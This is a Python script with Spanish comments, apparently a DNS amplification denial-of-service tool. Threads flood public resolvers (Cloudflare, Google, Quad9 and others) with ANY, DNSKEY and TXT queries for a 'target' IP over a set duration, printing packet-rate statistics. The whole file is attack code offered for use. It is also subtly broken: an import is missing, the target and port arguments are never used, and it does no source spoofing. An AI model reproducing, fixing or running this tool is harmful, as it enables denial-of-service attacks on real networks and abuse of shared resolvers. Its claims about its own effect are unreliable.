#!/usr/bin/env python3
"""
DNS Amplifier Extreme - Versión CORREGIDA y estabilizada
"""
import socket
import struct
import threading
import time
import sys
import random
import argparse
import ipaddress
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
import ctypes
import psutil
import os
import resource  # <-- AÑADIR
import signal    # <-- AÑADIR

# ================= CONFIGURACIÓN =================
class TurboConfig:
    MAX_THREADS = 500  # Reducir para mayor estabilidad
    SOCKET_BUFFER = 65535
    PACKETS_PER_BATCH = 500  # Reducir batch size
    USE_RAW_SOCKETS = False  # Desactivar temporalmente para debug
    REUSE_PORT = True
    
    # Reflectores optimizados
    DNS_REFLECTORS = [
        "1.1.1.1", "1.0.0.1",        # Cloudflare
        "8.8.8.8", "8.8.4.4",        # Google
        "9.9.9.9", "149.112.112.112", # Quad9
        "208.67.222.222", "208.67.220.220", # OpenDNS
        "94.140.14.14", "94.140.15.15", # AdGuard
    ]
    
    AMP_VECTORS = [
        ('ANY', 75.9),
        ('DNSKEY', 58.4),
        ('TXT', 50.2),
        ('NS', 41.3),
        ('SOA', 30.5),
    ]

# ================= SOCKET MANAGER CORREGIDO =================
class SocketManager:
    def __init__(self):
        self.sockets = []
        self.create_sockets()
    
    def create_sockets(self):
        """Crea pool de sockets UDP normales (más estable)"""
        for i in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)  # 1MB
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.1)
                self.sockets.append(sock)
            except Exception as e:
                print(f"[!] Error socket {i}: {e}")
                continue
    
    def get_socket(self):
        """Obtiene socket del pool (round-robin)"""
        if not self.sockets:
            self.create_sockets()
        return random.choice(self.sockets)

# ================= DNS AMPLIFIER CORREGIDO =================
class DNSAmplifierTurbo:
    def __init__(self, target: str, duration: int):
        self.target = target
        self.duration = duration
        self.packets_sent = 0
        self.bytes_sent = 0
        self.running = True
        self.socket_mgr = SocketManager()
        self.start_time = time.time()
        self.stats_lock = threading.Lock()
        
        # Señal para Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Maneja Ctrl+C correctamente"""
        print("\n[!] Deteniendo ataque...")
        self.running = False
    
    def create_dns_query(self, qtype: str) -> bytes:
        """Crea consulta DNS simple y eficiente"""
        # Mapeo de tipos
        type_map = {'ANY': 255, 'DNSKEY': 48, 'TXT': 16, 'NS': 2, 'SOA': 6}
        
        # Header DNS
        trans_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        
        header = struct.pack('!HHHHHH',
            trans_id,
            flags,
            questions,
            0, 0, 0  # Answer, Authority, Additional
        )
        
        # Dominio: isc.org (buena amplificación)
        domain = b'\x03isc\x03org\x00'
        qtype_val = type_map.get(qtype, 255)
        qclass = 1  # IN
        
        query = struct.pack('!HH', qtype_val, qclass)
        
        return header + domain + query
    
    def attack_worker(self, worker_id: int):
        """Worker optimizado y estable"""
        local_packets = 0
        local_bytes = 0
        
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                reflector = random.choice(TurboConfig.DNS_REFLECTORS)
                amp_type, _ = random.choice(TurboConfig.AMP_VECTORS)
                
                # Obtener socket del pool
                sock = self.socket_mgr.get_socket()
                
                # Enviar batch de paquetes
                for _ in range(100):  # Batch más pequeño
                    query = self.create_dns_query(amp_type)
                    
                    try:
                        # Enviar al reflector DNS
                        sock.sendto(query, (reflector, 53))
                        local_packets += 1
                        local_bytes += len(query)
                    except socket.error:
                        # Si hay error, crear nuevo socket
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(0.1)
                        continue
                
                # Actualizar estadísticas cada 1000 paquetes
                if local_packets >= 1000:
                    with self.stats_lock:
                        self.packets_sent += local_packets
                        self.bytes_sent += local_bytes
                    local_packets = 0
                    local_bytes = 0
                    
            except Exception as e:
                # Continuar pese a errores
                continue
        
        # Actualizar estadísticas finales del worker
        with self.stats_lock:
            self.packets_sent += local_packets
            self.bytes_sent += local_bytes
    
    def stats_monitor(self):
        """Monitor mejorado con reintentos"""
        last_packets = 0
        last_bytes = 0
        last_time = time.time()
        
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                time.sleep(2)  # Actualizar cada 2 segundos (menos overhead)
                
                current_time = time.time()
                elapsed = max(0.1, current_time - last_time)
                
                with self.stats_lock:
                    packets = self.packets_sent
                    bytes_sent = self.bytes_sent
                
                # Cálculo de Mbps
                new_packets = packets - last_packets
                new_bytes = bytes_sent - last_bytes
                
                if elapsed > 0 and new_bytes > 0:
                    mbps = (new_bytes * 8) / (elapsed * 1_000_000)
                    pps = new_packets / elapsed
                    
                    print(f"\r[STATS] Pkts: {packets:,} | "
                          f"Rate: {pps:,.0f} pps | "
                          f"Speed: {mbps:.2f} Mbps | "
                          f"Time: {int(current_time - self.start_time)}/{self.duration}s",
                          end='', flush=True)
                
                last_packets = packets
                last_bytes = bytes_sent
                last_time = current_time
                
            except Exception as e:
                continue
        
        print()  # Nueva línea final
    
    def launch_attack(self):
        """Lanzar ataque con manejo de errores"""
        print(f"[+] Target: {self.target}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] Threads: {TurboConfig.MAX_THREADS}")
        print(f"[+] Starting attack...\n")
        
        # Iniciar monitor
        monitor_thread = threading.Thread(target=self.stats_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Usar ThreadPoolExecutor (más estable que ProcessPool)
        with ThreadPoolExecutor(max_workers=TurboConfig.MAX_THREADS) as executor:
            futures = []
            for i in range(TurboConfig.MAX_THREADS):
                future = executor.submit(self.attack_worker, i)
                futures.append(future)
            
            # Esperar con timeout
            try:
                for future in as_completed(futures, timeout=self.duration + 5):
                    try:
                        future.result(timeout=1)
                    except:
                        pass
            except:
                pass
        
        # Finalización
        self.running = False
        total_time = time.time() - self.start_time
        
        print(f"\n\n[+] Attack completed!")
        print(f"[+] Total packets: {self.packets_sent:,}")
        print(f"[+] Total data: {self.bytes_sent / 1_000_000:.2f} MB")
        
        if total_time > 0:
            avg_mbps = (self.bytes_sent * 8) / (total_time * 1_000_000)
            print(f"[+] Average speed: {avg_mbps:.2f} Mbps")
            print(f"[+] Packets/second: {self.packets_sent / total_time:,.0f}")

# ================= MAIN CORREGIDO =================
def optimize_system():
    """Optimizaciones seguras"""
    print("[*] Applying safe optimizations...")
    
    try:
        # Aumentar límites de archivos
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        resource.setrlimit(resource.RLIMIT_NOFILE, (min(100000, hard), hard))
        print(f"[*] File descriptors: {soft} -> {min(100000, hard)}")
    except:
        pass
    
    try:
        # Prioridad de proceso
        os.nice(-10)  # Alta prioridad pero no -20
    except:
        pass
    
    # Mostrar info del sistema
    print(f"[*] CPU cores: {os.cpu_count()}")
    print(f"[*] PID: {os.getpid()}")

def main():
    parser = argparse.ArgumentParser(description="DNS Amplifier - Stable Version")
    parser.add_argument("host", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("time", type=int, help="Duration in seconds (1-600)")
    
    args = parser.parse_args()
    
    # Validaciones
    try:
        ipaddress.ip_address(args.host)
    except:
        print(f"[-] Invalid IP: {args.host}")
        return
    
    if args.time < 1 or args.time > 600:
        print("[-] Time must be 1-600 seconds")
        return
    
    # Optimizar sistema
    optimize_system()
    
    # Crear y ejecutar amplificador
    amplifier = DNSAmplifierTurbo(args.host, args.time)
    
    try:
        amplifier.launch_attack()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    except Exception as e:
        print(f"\n[-] Critical error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Verificar root solo si necesario
    if os.geteuid() != 0:
        print("[*] Running without root (limited performance)")
    
    main()
